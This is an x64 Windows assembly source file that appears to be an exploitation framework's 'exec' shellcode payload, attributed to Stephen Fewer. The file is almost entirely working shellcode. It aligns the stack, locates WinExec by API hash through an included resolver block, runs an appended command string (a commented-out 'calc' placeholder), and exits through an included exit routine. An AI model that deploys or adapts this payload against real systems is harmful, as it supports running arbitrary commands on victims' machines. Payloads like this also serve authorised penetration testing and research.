;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; Architecture: x64
; Size: 263 + strlen(command) + 1
;-----------------------------------------------------------------------------;
[BITS 64]
[ORG 0]

  cld                    ; Clear the direction flag.
  and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm"
start:                   ;
  pop rbp                ; Pop off the address of 'api_call' for calling later.
  mov rdx, 1
  lea rcx, [rbp+command-delta]
  mov r10d, 0x876F8B31   ; hash( "kernel32.dll", "WinExec" )
  call rbp               ; WinExec( &command, 1 );
  ; Finish up with the EXITFUNK.
%include "./src/block/block_exitfunk.asm"
command:
  ;db "calc", 0